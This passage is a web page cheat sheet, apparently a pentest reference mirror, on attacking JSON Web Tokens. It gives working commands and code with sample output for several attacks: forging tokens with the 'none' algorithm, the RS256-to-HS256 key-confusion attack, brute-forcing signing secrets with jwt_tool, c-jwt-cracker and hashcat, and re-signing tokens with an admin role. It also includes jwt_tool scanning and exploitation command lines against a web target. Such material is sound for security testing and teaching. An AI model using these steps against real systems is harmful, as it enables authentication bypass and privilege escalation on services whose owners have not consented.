</span></span><span style=display:flex><span>print(noneEncoded<span style=color:#f92672>.</span>decode())
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Output:
</span></span></span><span style=display:flex><span><span style=color:#e6db74>eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJsb2dpbiI6InRlc3QiLCJpYXQiOiIxNTA3NzU1NTcwIn0.
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
</span></span></code></pre></div><h2 id=jwt-signature---rs256-to-hs256>JWT Signature - RS256 to HS256
<a class=anchor href=#jwt-signature---rs256-to-hs256>#</a></h2><p>Because the public key can sometimes be obtained by the attacker, the attacker can modify the algorithm in the header to HS256 and then use the RSA public key to sign the data.</p><blockquote><p>The algorithm HS256 uses the secret key to sign and verify each message.
The algorithm RS256 uses the private key to sign the message and uses the public key for authentication.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> jwt
</span></span><span style=display:flex><span>public <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#39;public.pem&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>)<span style=color:#f92672>.</span>read()
</span></span><span style=display:flex><span>print public
</span></span><span style=display:flex><span>print jwt<span style=color:#f92672>.</span>encode({<span style=color:#e6db74>&#34;data&#34;</span>:<span style=color:#e6db74>&#34;test&#34;</span>}, key<span style=color:#f92672>=</span>public, algorithm<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;HS256&#39;</span>)
</span></span></code></pre></div><p>:warning: This behavior is fixed in the python library and will return this error <code>jwt.exceptions.InvalidKeyError: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC secret.</code>. You need to install the following version: <code>pip install pyjwt==0.4.3</code>.</p><p>Here are the steps to edit an RS256 JWT token into an HS256</p><ol><li><p>Convert our public key (key.pem) into HEX with this command.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$ cat key.pem | xxd -p | tr -d <span style=color:#e6db74>&#34;\\n&#34;</span>
</span></span><span style=display:flex><span>2d2d2d2d2d424547494e20505[<span style=color:#66d9ef>STRIPPED</span>]592d2d2d2d2d0a
</span></span></code></pre></div></li><li><p>Generate HMAC signature by supplying our public key as ASCII hex and with our token previously edited.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$ echo -n <span style=color:#e6db74>&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ&#34;</span> | openssl dgst -sha256 -mac HMAC -macopt hexkey<span style=color:#960050;background-color:#1e0010>:</span>2d2d2d2d2d424547494e20505[<span style=color:#66d9ef>STRIPPED</span>]592d2d2d2d2d0a
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>(stdin)= 8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0
</span></span></code></pre></div></li><li><p>Convert signature (Hex to &ldquo;base64 URL&rdquo;)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>$ python2 -c <span style=color:#e6db74>&#34;exec(\&#34;</span>import base64, binascii\nprint base64.urlsafe_b64encode(binascii.a2b_hex(<span style=color:#e6db74>&#39;8f421b351eb61ff226df88d526a7e9b9bb7b8239688c1f862f261a0c588910e0&#39;</span>)).replace(<span style=color:#e6db74>&#39;=&#39;</span>,<span style=color:#e6db74>&#39;&#39;</span>)\<span style=color:#e6db74>&#34;)&#34;</span>
</span></span></code></pre></div></li><li><p>Add signature to edited payload</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>[<span style=color:#66d9ef>HEADER EDITED RS256 TO HS256].[DATA EDITED].[SIGNATURE</span>]
</span></span><span style=display:flex><span>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IjIzIiwidXNlcm5hbWUiOiJ2aXNpdG9yIiwicm9sZSI6IjEifQ.j0IbNR62H_Im34jVJqfpubt7gjlojB-GLyYaDFiJEOA
</span></span></code></pre></div></li></ol><h2 id=breaking-jwts-secret>Breaking JWT&rsquo;s secret
<a class=anchor href=#breaking-jwts-secret>#</a></h2><p>Encode/Decode JWT with the secret.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> jwt
</span></span><span style=display:flex><span>encoded <span style=color:#f92672>=</span> jwt<span style=color:#f92672>.</span>encode({<span style=color:#e6db74>&#39;some&#39;</span>: <span style=color:#e6db74>&#39;payload&#39;</span>}, <span style=color:#e6db74>&#39;secret&#39;</span>, algorithm<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;HS256&#39;</span>) <span style=color:#75715e># encode with &#39;secret&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>encoded <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE&#34;</span>
</span></span><span style=display:flex><span>jwt<span style=color:#f92672>.</span>decode(encoded, <span style=color:#e6db74>&#39;Sn1f&#39;</span>, algorithms<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;HS256&#39;</span>]) <span style=color:#75715e># decode with &#39;Sn1f&#39; as the secret key</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># result</span>
</span></span><span style=display:flex><span>{<span style=color:#e6db74>u</span><span style=color:#e6db74>&#39;admin&#39;</span>: <span style=color:#66d9ef>True</span>, <span style=color:#e6db74>u</span><span style=color:#e6db74>&#39;sub&#39;</span>: <span style=color:#e6db74>u</span><span style=color:#e6db74>&#39;1234567890&#39;</span>, <span style=color:#e6db74>u</span><span style=color:#e6db74>&#39;name&#39;</span>: <span style=color:#e6db74>u</span><span style=color:#e6db74>&#39;John Doe&#39;</span>}
</span></span></code></pre></div><h3 id=jwt-tool>JWT tool
<a class=anchor href=#jwt-tool>#</a></h3><p>First, bruteforce the &ldquo;secret&rdquo; key used to compute the signature.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>git clone https<span style=color:#960050;background-color:#1e0010>:</span>//github.com/ticarpi/jwt_tool
</span></span><span style=display:flex><span>python3 -m pip install termcolor cprint pycryptodomex requests
</span></span><span style=display:flex><span>python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        \   \        \         \          \                    \
</span></span><span style=display:flex><span>   \__   |   |  \     |\__    __| \__    __|                    |
</span></span><span style=display:flex><span>         |   |   \    |      |          |       \         \     |
</span></span><span style=display:flex><span>         |        \   |      |          |    __  \     __  \    |
</span></span><span style=display:flex><span>  \      |      _     |      |          |   |     |   |     |   |
</span></span><span style=display:flex><span>   |     |     / \    |      |          |   |     |   |     |   |
</span></span><span style=display:flex><span>\        |    /   \   |      |          |\        |\        |   |
</span></span><span style=display:flex><span> \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
</span></span><span style=display:flex><span> Version <span style=color:#ae81ff>2.2</span>.2                \______|             @ticarpi
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Original JWT<span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>[+] secret is the CORRECT key!
</span></span><span style=display:flex><span>You can tamper/fuzz the token contents (-T/-I) and sign it using<span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span>python3 jwt_tool.py [<span style=color:#66d9ef>options here</span>] -S HS256 -p <span style=color:#e6db74>&#34;secret&#34;</span>
</span></span></code></pre></div><p>Then edit the field inside the JSON Web Token.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Current value of role is<span style=color:#960050;background-color:#1e0010>:</span> user
</span></span><span style=display:flex><span>Please enter new value and hit ENTER
</span></span><span style=display:flex><span>&gt; admin
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>1</span>] sub = <span style=color:#ae81ff>1234567890</span>
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>2</span>] role = admin
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>3</span>] iat = <span style=color:#ae81ff>1516239022</span>
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>0</span>] <span style=color:#66d9ef>Continue</span> to next step
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Please select a field number<span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span>(or <span style=color:#ae81ff>0</span> to <span style=color:#66d9ef>Continue</span>)
</span></span><span style=display:flex><span>&gt; <span style=color:#ae81ff>0</span>
</span></span></code></pre></div><p>Finally, finish the token by signing it with the previously retrieved &ldquo;secret&rdquo; key.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Token Signing<span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>1</span>] Sign token with known key
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>2</span>] Strip signature from token vulnerable to CVE-<span style=color:#ae81ff>2015</span>-<span style=color:#ae81ff>2951</span>
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>3</span>] Sign with Public Key bypass vulnerability
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>4</span>] Sign token with key file
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Please select an option from above (<span style=color:#ae81ff>1</span>-<span style=color:#ae81ff>4</span>)<span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span>&gt; <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Please enter the known key<span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span>&gt; secret
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Please enter the key length<span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>1</span>] HMAC-SHA256
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>2</span>] HMAC-SHA384
</span></span><span style=display:flex><span>[<span style=color:#ae81ff>3</span>] HMAC-SHA512
</span></span><span style=display:flex><span>&gt; <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Your new forged token<span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span>[+] URL safe<span style=color:#960050;background-color:#1e0010>:</span> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da_xtBsT0Kjw7truyhDwF5Ic
</span></span><span style=display:flex><span>[+] Standard<span style=color:#960050;background-color:#1e0010>:</span> eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic
</span></span></code></pre></div><ul><li>Recon: <code>python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw</code></li><li>Scanning: <code>python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -M pb</code></li><li>Exploitation: <code>python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin</code></li><li>Fuzzing: <code>python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -I -hc kid -hv custom_sqli_vectors.txt</code></li><li>Review: <code>python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin</code></li></ul><h3 id=jwt-cracker>JWT cracker
<a class=anchor href=#jwt-cracker>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>git clone https://github.com/brendan-rius/c-jwt-cracker
</span></span><span style=display:flex><span>./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9.cAOIAifu3fykvhkHpbuhbvtH807-Z2rI1FS3vX1XMjE
</span></span><span style=display:flex><span>Secret is <span style=color:#e6db74>&#34;Sn1f&#34;</span>
</span></span></code></pre></div><h3 id=hashcat>Hashcat
<a class=anchor href=#hashcat>#</a></h3><blockquote><p>Support added to crack JWT (JSON Web Token) with hashcat at 365MH/s on a single GTX1080 - <a href=https://twitter.com/hashcat/status/955154646494040065>src</a></p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/hashcat -m <span style=color:#ae81ff>16500</span> hash.txt -a <span style=color:#ae81ff>3</span> -w <span style=color:#ae81ff>3</span> ?a?a?a?a?a?a
</span></span><span style=display:flex><span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMj...Fh7HgQ:secret
</span></span></code></pre></div><h2 id=cve>CVE
<a class=anchor href=#cve>#</a></h2><ul><li>CVE-2015-2951 - The alg=none signature-bypass vulnerability</li><li>CVE-2016-10555 - The RS/HS256 public key mismatch vulnerability</li><li>CVE-2018-0114 - Key injection vulnerability</li><li>CVE-2019-20933/CVE-2020-28637 - Blank password vulnerability</li><li>CVE-2020-28042 - Null signature vulnerability</li></ul><h2 id=references>References
<a class=anchor href=#references>#</a></h2><ul><li><a href=https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6>Hacking JSON Web Token (JWT) - Hate_401</a></li><li><a href=https://ctf.rip/websec-ctf-authorization-token-jwt-challenge/>WebSec CTF - Authorization Token - JWT Challenge</a></li><li><a href=https://blog.securitybreached.org/2018/10/27/privilege-escalation-like-a-boss/>Privilege Escalation like a Boss - October 27, 2018 - janijay007</a></li><li><a href=https://medium.com/vandium-software/5-easy-steps-to-understanding-json-web-tokens-jwt-1164c0adfcec>5 Easy Steps to Understanding JSON Web Token</a></li><li><a href=https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html>Hacking JSON Web Tokens - From Zero To Hero Without Effort - Websecurify Blog</a></li><li><a href=https://nandynarwhals.org/hitbgsec2017-pasty/>HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng)</a></li><li><a href=https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries//>Critical vulnerabilities in JSON Web Token libraries - March 31, 2015 - Tim McLean</a></li><li><a href=https://github.com/dwyl/learn-json-web-tokens>Learn how to use JSON Web Tokens (JWT) for Authentication - @dwylhq</a></li><li><a href=https://medium.com/@blackhood/simple-jwt-hacking-73870a976750>Simple JWT hacking - @b1ack_h00d</a></li><li><a href=https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/>Attacking JWT authentication - Sep 28, 2016 - Sjoerd Langkemper</a></li><li><a href=https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9>How to Hack a Weak JWT Implementation with a Timing Attack - Jan 7, 2017 - Tamas Polgar</a></li><li><a href=https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html>HACKING JSON WEB TOKENS, FROM ZERO TO HERO WITHOUT EFFORT - Thu Feb 09 2017 - @pdp</a></li><li><a href=http://rootinthemiddle.org/write-up-jrr-token-lehack-2019/>Write up – JRR Token – LeHack 2019 - 07/07/2019 - LAPHAZE</a></li><li><a href=https://trustfoundry.net/jwt-hacking-101/>JWT Hacking 101 - TrustFoundry - Tyler Rosonke - December 8th, 2017</a></li><li><a href=https://insomniasec.com/blog/auth0-jwt-validation-bypass>JSON Web Token Validation Bypass in Auth0 Authentication API - Ben Knight Senior Security Consultant - April 16, 2020</a></li></ul></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div><a class="flex align-center" href=https://github.com/m00tiny/grayhatfreelancing/commit/3579e9c4ae7712d4e8fcdd17b931224d3fca8a8d title='Last modified by Stuart Gray | December 10, 2022' target=_blank rel=noopener><img src=/svg/calendar.svg class=book-icon alt=Calendar>
<span>December 10, 2022</span></a></div></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#jwt---json-web-token>JWT - JSON Web Token</a><ul><li><a href=#tools>Tools</a></li><li><a href=#jwt-format>JWT Format</a><ul><li><a href=#header>Header</a></li><li><a href=#payload>Payload</a></li></ul></li><li><a href=#jwt-signature---none-algorithm>JWT Signature - None algorithm</a></li><li><a href=#jwt-signature---rs256-to-hs256>JWT Signature - RS256 to HS256</a></li><li><a href=#breaking-jwts-secret>Breaking JWT&rsquo;s secret</a><ul><li><a href=#jwt-tool>JWT tool</a></li><li><a href=#jwt-cracker>JWT cracker</a></li><li><a href=#hashcat>Hashcat</a></li></ul></li><li><a href=#cve>CVE</a></li><li><a href=#references>References</a></li></ul></li></ul></nav></div></aside></main></body></html>